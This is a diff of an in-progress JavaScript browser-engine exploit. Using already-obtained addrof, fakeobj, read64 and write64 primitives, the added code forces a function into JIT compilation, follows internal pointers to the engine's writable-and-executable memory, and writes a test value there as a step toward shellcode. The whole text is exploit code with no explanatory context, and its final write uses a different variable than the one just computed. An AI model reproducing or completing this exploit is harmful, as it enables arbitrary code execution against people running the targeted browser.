@@ -237,9 +237,45 @@ for (var i = 0; i < 1000; ++i) {
             port.postMessage("addr deb " + hex1(addr))
             port.postMessage(hex1(stage2.fakeobj(addr).p));
             port.postMessage("lolzzz");
+            
+            function makeJITCompiledFunction() {
+    // Some code to avoid inlining...
+    function target(num) {
+        for (var i = 2; i < num; i++) {
+            if (num % i === 0) {
+                return false;
+            }
+        }
+        return true;
+    }
+
+    // Force JIT compilation.
+    for (var i = 0; i < 1000; i++) {
+        target(i);
+    }
+    for (var i = 0; i < 1000; i++) {
+        target(i);
+    }
+    for (var i = 0; i < 1000; i++) {
+        target(i);
+    }
+    return target;
+}
+
+
+            var func = makeJITCompiledFunction();
+    var funcAddr = stage2.addrof(func);
+    print("[+] Shellcode function object @ " + hex1(funcAddr));
+    var executableAddr = stage2.read64(funcAddr + 24);
+    print("[+] Executable instance @ " + hex1(executableAddr));
+    var jitCodeAddr = stage2.read64(executableAddr + 24);
+    print("[+] JITCode instance @ " + hex1(jitCodeAddr));
+            var rwxMemAddr = stage2.read64(jitCodeAddr+32);
+            print("[+] RWX Memory instance @ " + hex1(rwxMemAddr));
+            stage2.write64((rwx & 0xFFFFFFFF8),0x4141414141)
             //var socket = new WebSocket("")
             //const socket = new TextEncoder();
-            var mathfunc = stage2.addrof(Math.sin)
+            /*var mathfunc = stage2.addrof(Math.sin)
             port.postMessage(hex1(mathfunc))
             var exe = stage2.read64(mathfunc+0x18)
             port.postMessage(hex1(exe))
@@ -249,7 +285,7 @@ for (var i = 0; i < 1000; ++i) {
             port.postMessage(hex1(rwx))
             stage2.write64((jitcode & 0xffffffff8),0x41414141)
             //stage2.write64(mathfunc,0x4141414141)
-            Math.sin()
+            Math.sin()*/
             /*while(!(port1.onmessage())) {
                 port.postMessage("not")
             }
